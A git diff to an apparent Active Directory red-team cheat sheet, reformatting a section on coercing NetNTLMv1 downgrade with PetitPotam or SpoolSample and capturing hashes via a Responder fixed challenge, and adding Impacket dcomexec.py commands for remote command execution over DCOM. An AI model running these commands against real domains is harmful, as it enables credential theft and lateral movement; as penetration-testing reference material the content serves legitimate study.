@@ -1674,10 +1674,10 @@ klist
 
 :information_source: : Coerce a callback using PetitPotam or SpoolSample on an affected machine and downgrade the authentication to **NetNTLMv1 Challenge/Response authentication**. This uses the outdated encryption method DES to protect the NT/LM Hashes.
 
-Requirements:
+**Requirements**:
 * LmCompatibilityLevel = 0x1: Send LM & NTLM (`reg query HKLM\SYSTEM\CurrentControlSet\Control\Lsa /v lmcompatibilitylevel`)
 
-
+**Exploitation**:
 * Capturing using Responder: Edit the /etc/responder/Responder.conf file to include the magical **1122334455667788** challenge
     ```ps1
     HTTPS = On
@@ -2210,6 +2210,13 @@ Set-DomainUserPassword -Identity 'TargetUser' -AccountPassword $NewPassword
 
 > DCOM is an extension of COM (Component Object Model), which allows applications to instantiate and access the properties and methods of COM objects on a remote computer.
 
+
+* Impacket DcomExec.py
+  ```ps1
+  dcomexec.py [-h] [-share SHARE] [-nooutput] [-ts] [-debug] [-codec CODEC] [-object [{ShellWindows,ShellBrowserWindow,MMC20}]] [-hashes LMHASH:NTHASH] [-no-pass] [-k] [-aesKey hex key] [-dc-ip ip address] [-A authfile] [-keytab KEYTAB] target [command ...]
+  dcomexec.py -share C$ -object MMC20 '<DOMAIN>/<USERNAME>:<PASSWORD>@<MACHINE_CIBLE>'
+  dcomexec.py -share C$ -object MMC20 '<DOMAIN>/<USERNAME>:<PASSWORD>@<MACHINE_CIBLE>' 'ipconfig'
+  ```
 * CheeseTools - https://github.com/klezVirus/CheeseTools
   ```powershell
   # https://klezvirus.github.io/RedTeaming/LateralMovement/LateralMovementDCOM/
